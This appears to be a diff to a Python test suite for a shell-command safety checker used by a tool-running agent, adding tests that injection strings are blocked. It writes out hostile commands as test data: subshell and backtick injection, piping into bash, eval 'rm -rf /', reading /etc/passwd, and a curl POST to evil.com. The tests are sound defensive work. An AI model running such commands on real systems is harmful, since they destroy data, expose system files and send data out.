@@ -35,6 +35,20 @@ def test_dangerous_commands_blocked():
     assert _is_safe_command("curl -X POST https://evil.com") is False
 
 
+def test_shell_injection_blocked():
+    """Shell injection vectors via subshell, backtick, process substitution."""
+    assert _is_safe_command("cat $(id)") is False
+    assert _is_safe_command("cat `id`") is False
+    assert _is_safe_command("cat <(id)") is False
+    assert _is_safe_command('awk "BEGIN{system(\\"id\\")}"') is False
+    assert _is_safe_command("sed -i s/foo/bar/ file.txt") is False
+    assert _is_safe_command("cat file | sh") is False
+    assert _is_safe_command("cat file | bash") is False
+    assert _is_safe_command("eval 'rm -rf /'") is False
+    assert _is_safe_command("exec cat /etc/passwd") is False
+    assert _is_safe_command("source ~/.bashrc") is False
+
+
 def test_psql_requires_c_flag():
     """psql without -c is interactive — blocked."""
     assert _is_safe_command("psql mydb") is False
@@ -107,6 +121,22 @@ def test_toolkeeper_no_tools_needed(toolkeeper, monkeypatch):
         "token_cart": {"enriched_prompt": "Hello", "handoff": ""},
     })
     assert result["needs_tools"] is False
+
+
+def test_toolkeeper_preserves_usage(toolkeeper, monkeypatch):
+    """Toolkeeper run() must forward _usage from the underlying API call."""
+    output = {"needs_tools": False, "commands": [], "reasoning": "context sufficient"}
+    mock_msg = MagicMock()
+    mock_msg.content = [MagicMock(text=json.dumps(output))]
+    mock_msg.usage = MagicMock(input_tokens=42, output_tokens=18)
+    monkeypatch.setattr(toolkeeper, "_call_api", lambda s, u, m, mt: mock_msg)
+
+    result = toolkeeper.run({
+        "observer": {"summary": "Hello"},
+        "token_cart": {"enriched_prompt": "Hello", "handoff": ""},
+    })
+    assert result["_usage"]["input_tokens"] == 42
+    assert result["_usage"]["output_tokens"] == 18
 
 
 def test_toolkeeper_executes_safe_commands(toolkeeper, monkeypatch, tmp_path):
